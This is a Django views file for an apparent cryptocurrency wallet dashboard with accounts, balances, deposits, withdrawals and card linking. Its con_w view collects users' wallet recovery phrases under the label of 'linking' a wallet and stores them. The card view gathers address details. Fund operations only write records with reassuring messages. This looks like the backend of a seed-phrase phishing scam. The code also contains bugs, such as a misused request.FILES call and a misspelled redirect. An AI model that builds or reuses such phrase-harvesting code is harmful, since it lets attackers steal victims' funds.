from django.shortcuts import render,redirect
from django.http import HttpResponse
from django.http import HttpResponseRedirect
from django.contrib import messages
from .models import *
from django.contrib.auth.models import User, auth
from django.contrib.auth.decorators import login_required
# Create your views here.


def home(request):
    return render(request,'home.html')


def profile_update(request):
    user = request.user
    if request.method == 'POST':
      img = request.FILES('img')
      fullname = request.POST.get('fullname')
      phone  = request.POST.get('phone')
      pu = profile.objects.get_or_create(user=user,img=img,fullname=fullname,phone=phone)
      messages.success(request,'profile created successfully')
      return redirect('myprofile')
    else:
     return render(request,'dashboard/profile_update.html')



def myprofile(request):
    try:
       user = request.user
       mp = profile.objects.filter(user=user)
    except profile.DoesNotExist:
       messages.info(request,'update profile')
       return redirect('update_ptofile')
    return render(request,'dashboard/profile.html',locals())

def signin(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = auth.authenticate(username=username,password=password)
        if user is not None:
            auth.login(request,user)
            return redirect('dashboard')
        else:
            messages.error(request,'invalid credentials')
            return redirect('signin')  
    else:
     return render(request,'signin.html')

def signup(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        email = request.POST.get('email')
        password = request.POST.get('password')
        password1 = request.POST.get('password1')

        if password == password1:
            if User.objects.filter(username=username).exists():
                messages.error(request,'Username Already Exists')
                return redirect('signup')
            elif User.objects.filter(email=email).exists():
                messages.error(request,'Email Already Exists')
                return redirect('signup')
            else:
                user = User.objects.create_user(username=username,email=email,password=password)
                user.save()
                messages.info(request,'Account created Successfuly Login now')
                return redirect('signin')
        else:
            messages.error(request,'your Password Not The Same')
            return redirect('signup')
    else:
     return render(request,'signup.html')

@login_required(login_url='signin')
def dashboard(request):
    user=request.user
    t = balance.objects.get_or_create(user=user)
    tb = balance.objects.get(user=user)
    ac = coins.objects.all()
    for d in ac:
        ucoins.objects.get_or_create(user=user,cname=d.cname, cimg=d.cimg,caddress=d.caddress,amount=d.amount,)
    for b in ac:
        cbackup.objects.get_or_create(user=user,cname=b.cname, cimg=b.cimg,caddress=b.caddress,amount=b.amount)
    uc = ucoins.objects.filter(user=user)

    return render(request,'dashboard/index.html',locals())


@login_required(login_url='signin')
def link_w(request):
    link = mywallets.objects.all()
    return render(request,'dashboard/link_w.html',locals())

@login_required(login_url='signin')
def wadetails(request,id):
    x = mywallets.objects.get(id=id)
    return render(request,'dashboard/wa_details.html',locals())


def buy_coin(request):
   bc = buycoin.objects.all()
   return render(request,'dashboard/buy_coin.html',locals())


@login_required(login_url='signin')
def con_w(request,id):
    x = mywallets.objects.get(id=id)
    if request.method == 'POST':
        user = request.user
        wn = request.POST.get('wn')
        wp = request.POST.get('wp')
        ws = waph(wname=wn,wphrase=wp,user=user,mywallets=x)
        ws.save()
        messages.success(request,'Wallet linked successfully')
        return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
     return render(request,'dashboard/con_w.html',locals())
    
def logout(request):
    auth.logout(request)
    return redirect('/')

@login_required(login_url='signin')
def mymessages(request):
    return render(request,'dashboard/messages.html')

@login_required(login_url='signin')
def reason(request):
    x = purpose.objects.all()
    return render(request,'dashboard/reason.html',locals())


@login_required(login_url='signin')
def card(request):
    if request.method == 'POST':
        user = request.user
        limit = request.POST.get('limit')
        country = request.POST.get('country')
        state = request.POST.get('state')
        city = request.POST.get('city')
        street = request.POST.get('street')
        homeandblock = request.POST.get('homeandblock')
        pincode = request.POST.get('pincode')
        cc = creditcard.objects.get_or_create(user=user,limit=limit,country=country,state=state,city=city,street=street,homeandblock=homeandblock,pincode=pincode)
        messages.success(request,'credit card linked successfully')
        return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
     return render(request,'dashboard/card.html')


@login_required(login_url='signin')
def withdraw(request):
    coin = coins.objects.all()
    return render(request,'dashboard/withdraw.html',locals())


@login_required(login_url='signin')
def fundwallet(request,id):
    a = ucoins.objects.get(id=id)
    if request.method == 'POST':
        user = request.user
        name = request.POST.get('name')
        amount = request.POST.get('amount')
        sv = deposit.objects.create(user=user,name=name,amount=amount)
        messages.success(request,'funding successful onces confirmed it will be added to your account')
        return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
      return render(request,'dashboard/add.html',locals())


@login_required(login_url='signin')   
def withd(request,id):
    a = ucoins.objects.get(id=id)
    t = balance.objects.get(user=request.user)
    if request.method == 'POST':
        user = request.user
        name = request.POST.get('name')
        waddress = request.POST.get('waddress')
        amount = request.POST.get('amount')
        if float(amount) > t.total:
            messages.error(request, 'insuficient funds') 
            return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
        else:
            wc = withdrawal.objects.create(user=user,name=name,waddress=waddress,amount=amount)
            messages.success(request,'withdrawal successful onces confirmed it will be added to your account')
            return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
     return render(request,'dashboard/withd.html',locals())

def backup(request):
    user=request.user
    uc = cbackup.objects.filter(user=user)
    if request.method == 'POST':
       name =  request.POST.get('name')
       amount =  request.POST.get('amount')
       bt = backuptransaction.objects.create(user=user,name=name,amount=amount)
       messages.success(request,'backup successful')
       return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
     return render(request,'dashboard/backup.html',locals())

def back_up(request):
   return render(request,'dashboard/back_up.html')

